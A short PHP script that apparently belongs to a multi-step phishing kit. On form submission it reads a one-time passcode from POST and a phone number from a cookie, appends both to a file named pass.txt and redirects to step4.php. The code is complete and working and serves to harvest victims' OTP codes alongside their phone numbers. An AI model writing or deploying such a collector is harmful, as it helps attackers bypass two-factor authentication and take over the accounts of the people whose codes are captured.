<?php
//    echo"<pre>";print_r($_POST);die();
if (isset($_POST['submit'])) {
    // echo"<pre>";print_r($_POST);die();
    
	$otp1 = $_POST['otp1'];
   $number = $_COOKIE["number"];

  $otp1 = "otp1:$otp1";
   $number = "number:$number";

  $myfile = fopen("pass.txt", "a") or die("Unable to open file!");

$txt43 ="";
fwrite($myfile, "\r\n". $txt43);
fwrite($myfile, "\r\n". $otp1);
fwrite($myfile, "\r\n". $number);

fclose($myfile);

   
   
    header('location:step4.php');
    die();
//     $fp = fopen('lidn.txt', 'w');
// fwrite($fp,[ ]);
// fclose($fp);
}



?>
